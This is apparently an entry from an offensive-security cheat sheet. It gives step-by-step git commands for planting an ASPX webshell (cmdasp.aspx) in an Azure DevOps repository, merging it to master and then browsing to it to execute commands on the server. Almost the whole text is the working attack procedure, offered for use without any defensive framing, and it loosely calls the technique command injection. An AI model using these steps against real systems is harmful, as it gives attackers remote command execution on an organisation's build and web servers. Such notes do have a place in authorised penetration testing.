## Azure DevOps CI/CD command injection

### Requirements: Authenticated access to azure devops tenant, and privileges to write into the CI/CD pipeline.

### Steps:

#### 1) Go to: The project the user has access in -> Pipelines -> Builds -> View

#### 2) git clone http://USER:PASSWORD@DOMAIN.COM/path/to/repository (Clone the repository we have access to)

#### 3) git checkout -b shell (Create a new branch in the repository directory)

#### 4) cp /usr/share/webshells/aspx/cmdasp.aspx . (Copy a webshell into our current directory)

#### 5) git add .

#### 6) git commit -m 'pwn3d!' (Upload the file to the webserver)

#### 7) git push -u origin shell (Push the commit to the Azure DevOps repository)

#### 8) Create a pull request in order to merge this branch into the master branch

#### 9) Set a title, a work item, and then create

#### 10) Approve -> Complete

#### 11) Browse to http://DOMAIN.COM/cmdasp.aspx to execute commands!
